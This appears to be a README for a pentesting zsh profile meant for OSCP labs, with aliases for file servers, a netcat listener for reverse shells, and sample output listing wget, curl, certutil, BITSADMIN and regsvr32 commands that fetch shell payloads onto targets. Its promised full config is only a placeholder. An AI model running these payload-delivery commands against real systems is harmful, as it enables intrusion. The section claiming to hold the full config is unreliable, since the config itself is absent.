#Pentesting Zsh Profile (~/.zshrc)

This customized `~/.zshrc` for Kali Linux (zsh interactive shells) enhances productivity during OSCP exam prep and pentesting. It includes optimized settings, keybindings, completions, and aliases to speed up common tasks like file transfer servers and network checks. When you test and sleep at the same time you need colors and speed.

Source after edits: `source ~/.zshrc`. Restart terminal or run `exec zsh`.

## Key Features
- **Core Options**: autocd, interactive comments, magic equals, no nomatch errors, instant job notifications.
- **Keybindings**: Emacs-style with Ctrl+U kill line, Ctrl+arrows for words, Page Up/Down history, Shift+Tab undo.
- **Completions**: Menu select, verbose, matcher for case-insensitivity.
- **History**: 2000 entries, ignore dups/spaces, verify expansions.
- **Prompt**: Fancy two-line Kali theme (toggle with Ctrl+P), syntax highlighting, autosuggestions.
- **Aliases**: ls colors (ll/la/l), grep/ip/diff colored.

## Pentesting Aliases
These speed up OSCP workflows by automating `/home/user/Exploits` directory changes, IP detection (prefers tun0 for VPN), and server starts with client commands.

- **c**: `clear` screen.
- **infostart**: Prints current dir and network status (eth0/tun0 IPs).
- **get_device_ip**: Extracts primary non-loopback IPv4 (used internally).
- **ftps [user pass]**: Anonymous RW FTP on port 21 (or custom user/pass).
- **ncstart**: Netcat listener on 443 for reverse shells/files.
- **pythonstart [port]**: Python HTTP server (default 80) with Linux/Windows/LoL download commands.

**Example Output (pythonstart)**:
```
Current directory: /home/user/Exploits
------------------------------
| Network status:
------------------------------
|   eth0: up (192.168.122.80)
------------------------------
|   tun0: down
------------------------------
Python HTTP server: http://192.168.122.80:80

=== Linux Commands ===
wget http://192.168.122.80:80/shell.sh -O shell.sh
curl http://192.168.122.80:80/shell.sh -o shell.sh

=== Windows Commands ===
powershell -c IWR http://192.168.122.80:80/shell.exe -OutFile shell.exe
certutil -urlcache -f http://192.168.122.80:80/shell.exe shell.exe

=== Living off the Land ===
BITSADMIN /transfer job http://192.168.122.80:80/shell.exe %TEMP%/shell.exe
regsvr32 /s /n /u /i:http://192.168.122.80:80/shell.sct scrobj.dll
```
Copy-paste commands to targets for quick payload delivery. 

## Full Config
Paste this into `~/.zshrc` (backs up original: `cp ~/.zshrc ~/.zshrc.bak`). Matches your provided config with fixes (e.g., get_device_ip defined, clean infostart). 

```
# ~/.zshrc file for zsh interactive shells.
# OSCP Pentesting Profile - Speeds up file transfers, servers, network checks.

[Your full config here - the provided zshrc content with pentest aliases at the end]
```

**Usage Tips**:
- Place exploits in `/home/user/Exploits`.
- For VPN: Connect OpenVPN first; infostart shows tun0 IP.
- Toggle prompt: Ctrl+P (twoline/oneline).
- Test: `pythonstart 8080` → Serves on 8080 with commands.

## Customization
Edit `/home/user/Exploits` path if needed. Add more (e.g., phpstart from history). Reload: `source ~/.zshrc`. Ideal for OSCP labs—reduces keystrokes for priv esc testing.
